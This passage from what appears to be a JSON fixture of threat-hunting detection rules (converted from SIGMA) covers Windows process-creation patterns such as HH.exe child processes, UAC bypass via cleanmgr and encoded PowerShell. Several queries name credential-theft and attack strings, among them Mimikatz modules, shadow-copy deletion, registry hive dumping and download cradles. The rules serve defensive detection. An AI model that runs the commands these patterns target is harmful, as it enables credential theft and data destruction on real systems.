            "description": "Detects the use of SharpEvtHook, a tool that tampers with the Windows event logs",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "HackTool - SharpEvtMute Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\SharpEvtMute.exe\" or tgt.process.displayName=\"SharpEvtMute\" or (tgt.process.cmdline contains \"--Filter \\\"rule \" or tgt.process.cmdline contains \"--Encoded --Filter \\\\\"\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1077
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious child process of a Microsoft HTML Help (HH.exe)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047",
                "t1059",
                "t1059",
                "t1059",
                "t1059",
                "t1218",
                "t1218",
                "t1218",
                "t1218",
                "t1566",
                "t1566"
            ],
            "name": "HTML Help HH.EXE Suspicious Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\hh.exe\" and (tgt.process.image.path contains \"\\CertReq.exe\" or tgt.process.image.path contains \"\\CertUtil.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\installutil.exe\" or tgt.process.image.path contains \"\\MSbuild.exe\" or tgt.process.image.path contains \"\\MSHTA.EXE\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\schtasks.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1078
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of a schtask that executes a file from C:\\Users\\<USER>\\AppData\\Local",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053",
                "t1059"
            ],
            "name": "Suspicious Schtasks Execution AppData Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \"/Create\" and tgt.process.cmdline contains \"/RU\" and tgt.process.cmdline contains \"/TR\" and tgt.process.cmdline contains \"C:\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\\") and (tgt.process.cmdline contains \"NT AUT\" or tgt.process.cmdline contains \" SYSTEM \")) and (not ((src.process.image.path contains \"\\AppData\\Local\\Temp\\\" and src.process.image.path contains \"TeamViewer_.exe\") and tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \"/TN TVInstallRestore\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1079
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1140",
                "t1059"
            ],
            "name": "PowerShell Base64 Encoded FromBase64String Cmdlet",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"OjpGcm9tQmFzZTY0U3RyaW5n\" or tgt.process.cmdline contains \"o6RnJvbUJhc2U2NFN0cmluZ\" or tgt.process.cmdline contains \"6OkZyb21CYXNlNjRTdHJpbm\" or (tgt.process.cmdline contains \"OgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcA\" or tgt.process.cmdline contains \"oAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnA\" or tgt.process.cmdline contains \"6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1080
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may search the Registry on compromised systems for insecurely stored credentials.\nThe Windows Registry stores configuration information that can be used by the system or other programs.\nAdversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1552"
            ],
            "name": "Enumeration for Credentials in Registry",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\reg.exe\" and (tgt.process.cmdline contains \" query \" and tgt.process.cmdline contains \"/t \" and tgt.process.cmdline contains \"REG_SZ\" and tgt.process.cmdline contains \"/s\")) and ((tgt.process.cmdline contains \"/f \" and tgt.process.cmdline contains \"HKLM\") or (tgt.process.cmdline contains \"/f \" and tgt.process.cmdline contains \"HKCU\") or tgt.process.cmdline contains \"HKCU\\Software\\SimonTatham\\PuTTY\\Sessions\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1081
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of electron apps (teams, discord, slack, etc.). This could be a potential sign of \".asar\" file tampering (See reference section for more information) or binary execution proxy through specific CLI arguments (see related rule)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Suspicious Electron Application Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\chrome.exe\" or src.process.image.path contains \"\\discord.exe\" or src.process.image.path contains \"\\GitHubDesktop.exe\" or src.process.image.path contains \"\\keybase.exe\" or src.process.image.path contains \"\\msedge.exe\" or src.process.image.path contains \"\\msedgewebview2.exe\" or src.process.image.path contains \"\\msteams.exe\" or src.process.image.path contains \"\\slack.exe\" or src.process.image.path contains \"\\teams.exe\") and ((tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \":\\ProgramData\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \"\\AppData\\Local\\Temp\\\" or tgt.process.image.path contains \"\\Users\\Public\\\" or tgt.process.image.path contains \"\\Windows\\Temp\\\")) and (not (src.process.image.path contains \"\\Discord.exe\" and tgt.process.image.path contains \"\\cmd.exe\" and tgt.process.cmdline contains \"\\NVSMI\\nvidia-smi.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1082
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of Replace.exe which can be used to replace file with another file",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Replace.exe Usage",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\replace.exe\" and (tgt.process.cmdline contains \"-a\" or tgt.process.cmdline contains \"/a\" or tgt.process.cmdline contains \"\u2013a\" or tgt.process.cmdline contains \"\u2014a\" or tgt.process.cmdline contains \"\u2015a\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1083
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect execution of suspicious double extension files in ParentCommandLine",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Suspicious Parent Double Extension File Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \".doc.lnk\" or src.process.image.path contains \".docx.lnk\" or src.process.image.path contains \".xls.lnk\" or src.process.image.path contains \".xlsx.lnk\" or src.process.image.path contains \".ppt.lnk\" or src.process.image.path contains \".pptx.lnk\" or src.process.image.path contains \".rtf.lnk\" or src.process.image.path contains \".pdf.lnk\" or src.process.image.path contains \".txt.lnk\" or src.process.image.path contains \".doc.js\" or src.process.image.path contains \".docx.js\" or src.process.image.path contains \".xls.js\" or src.process.image.path contains \".xlsx.js\" or src.process.image.path contains \".ppt.js\" or src.process.image.path contains \".pptx.js\" or src.process.image.path contains \".rtf.js\" or src.process.image.path contains \".pdf.js\" or src.process.image.path contains \".txt.js\") or (src.process.cmdline contains \".doc.lnk\" or src.process.cmdline contains \".docx.lnk\" or src.process.cmdline contains \".xls.lnk\" or src.process.cmdline contains \".xlsx.lnk\" or src.process.cmdline contains \".ppt.lnk\" or src.process.cmdline contains \".pptx.lnk\" or src.process.cmdline contains \".rtf.lnk\" or src.process.cmdline contains \".pdf.lnk\" or src.process.cmdline contains \".txt.lnk\" or src.process.cmdline contains \".doc.js\" or src.process.cmdline contains \".docx.js\" or src.process.cmdline contains \".xls.js\" or src.process.cmdline contains \".xlsx.js\" or src.process.cmdline contains \".ppt.js\" or src.process.cmdline contains \".pptx.js\" or src.process.cmdline contains \".rtf.js\" or src.process.cmdline contains \".pdf.js\" or src.process.cmdline contains \".txt.js\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1084
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of \"query.exe\" a system binary to exfil information such as \"sessions\" and \"processes\" for later use",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Query Usage To Exfil Data",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \":\\Windows\\System32\\query.exe\" and (tgt.process.cmdline contains \"session >\" or tgt.process.cmdline contains \"process >\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1085
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious process creation as SYSTEM user (suspicious program or command line parameter)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1134",
                "t1003",
                "t1027"
            ],
            "name": "Suspicious SYSTEM User Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((((tgt.process.integrityLevel in (\"System\",\"S-1-16-16384\")) and (tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\")) and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\forfiles.exe\" or tgt.process.image.path contains \"\\hh.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\ping.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.cmdline contains \" -NoP \" or tgt.process.cmdline contains \" -W Hidden \" or tgt.process.cmdline contains \" -decode \" or tgt.process.cmdline contains \" /decode \" or tgt.process.cmdline contains \" /urlcache \" or tgt.process.cmdline contains \" -urlcache \" or tgt.process.cmdline=\"* -e* JAB*\" or tgt.process.cmdline=\"* -e* SUVYI*\" or tgt.process.cmdline=\"* -e* SQBFAFgA*\" or tgt.process.cmdline=\"* -e* aWV4I*\" or tgt.process.cmdline=\"* -e* IAB*\" or tgt.process.cmdline=\"* -e* PAA*\" or tgt.process.cmdline=\"* -e* aQBlAHgA*\" or tgt.process.cmdline contains \"vssadmin delete shadows\" or tgt.process.cmdline contains \"reg SAVE HKLM\" or tgt.process.cmdline contains \" -ma \" or tgt.process.cmdline contains \"Microsoft\\Windows\\CurrentVersion\\Run\" or tgt.process.cmdline contains \".downloadstring(\" or tgt.process.cmdline contains \".downloadfile(\" or tgt.process.cmdline contains \" /ticket:\" or tgt.process.cmdline contains \"dpapi::\" or tgt.process.cmdline contains \"event::clear\" or tgt.process.cmdline contains \"event::drop\" or tgt.process.cmdline contains \"id::modify\" or tgt.process.cmdline contains \"kerberos::\" or tgt.process.cmdline contains \"lsadump::\" or tgt.process.cmdline contains \"misc::\" or tgt.process.cmdline contains \"privilege::\" or tgt.process.cmdline contains \"rpc::\" or tgt.process.cmdline contains \"sekurlsa::\" or tgt.process.cmdline contains \"sid::\" or tgt.process.cmdline contains \"token::\" or tgt.process.cmdline contains \"vault::cred\" or tgt.process.cmdline contains \"vault::list\" or tgt.process.cmdline contains \" p::d \" or tgt.process.cmdline contains \";iex(\" or tgt.process.cmdline contains \"MiniDump\" or tgt.process.cmdline contains \"net user \"))) and (not ((tgt.process.cmdline contains \"ping\" and tgt.process.cmdline contains \"127.0.0.1\" and tgt.process.cmdline contains \" -n \") or (tgt.process.image.path contains \"\\PING.EXE\" and src.process.cmdline contains \"\\DismFoDInstall.cmd\") or src.process.image.path contains \":\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\" or ((src.process.image.path contains \":\\Program Files (x86)\\Java\\\" or src.process.image.path contains \":\\Program Files\\Java\\\") and src.process.image.path contains \"\\bin\\javaws.exe\" and (tgt.process.image.path contains \":\\Program Files (x86)\\Java\\\" or tgt.process.image.path contains \":\\Program Files\\Java\\\") and tgt.process.image.path contains \"\\bin\\jp2launcher.exe\" and tgt.process.cmdline contains \" -ma \")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1086
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the installation of VsCode tunnel (code-tunnel) as a service.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1071"
            ],
            "name": "Visual Studio Code Tunnel Service Installation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"tunnel \" and tgt.process.cmdline contains \"service\" and tgt.process.cmdline contains \"internal-run\" and tgt.process.cmdline contains \"tunnel-service.log\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1087
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using Disk Cleanup",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\\"\\system32\\cleanmgr.exe /autoclean /d C:\" and src.process.cmdline=\"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1088
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential commandline obfuscation using known escape characters",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1140"
            ],
            "name": "Potential Commandline Obfuscation Using Escape Characters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"h^t^t^p\" or tgt.process.cmdline contains \"h\\\"t\\\"t\\\"p\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1089
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious output redirection to the local admins share, this technique is often found in malicious scripts or hacktool stagers",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1048"
            ],
            "name": "Suspicious Redirection to Local Admin Share",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \">\" and (tgt.process.cmdline contains \"\\\\127.0.0.1\\admin$\\\" or tgt.process.cmdline contains \"\\\\localhost\\admin$\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1090
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated Powershell via COMPRESS OBFUSCATION",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation COMPRESS OBFUSCATION",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
